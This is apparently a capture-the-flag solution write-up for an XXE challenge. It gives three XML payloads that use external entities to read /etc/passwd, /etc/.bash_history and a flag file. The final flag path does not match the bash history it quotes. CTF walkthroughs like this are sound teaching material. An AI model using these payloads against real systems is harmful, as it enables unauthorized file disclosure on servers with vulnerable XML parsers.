# How to Solve the Challenge?

Intercept the check availability request using Burp and modify the XML payload to the below one, and send it.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<availabilityCheck>
  <item>
    &xxe;
  </item>
</availabilityCheck>
```

This will return the etc/passwd file that contains **ctfplayer:x:1001:1001: This path is for you CTF Player: /etc/.bash_history** this is obviously a hint to go look in the .bash_history file, using the below payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/.bash_history"> ]>
<availabilityCheck>
  <item>
    &xxe;
  </item>
</availabilityCheck>
```

This will return the bash history file which directly points to where the flag is, as such;

```bash
cd source/main/etc
mkdir env_variables
cd env_variables
nano ctf_flag_maybe.txt
```
Meaning that the players would have to send one more XML payload to retrieve the contents of **etc/env_variables/CTF_fL4g_m4yb3.txt**, as such:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/env_variables/CTF_fL4g_m4yb3.txt"> ]>
<availabilityCheck>
  <item>
    &xxe;
  </item>
</availabilityCheck>
```

This will return the flag, HOORAY!
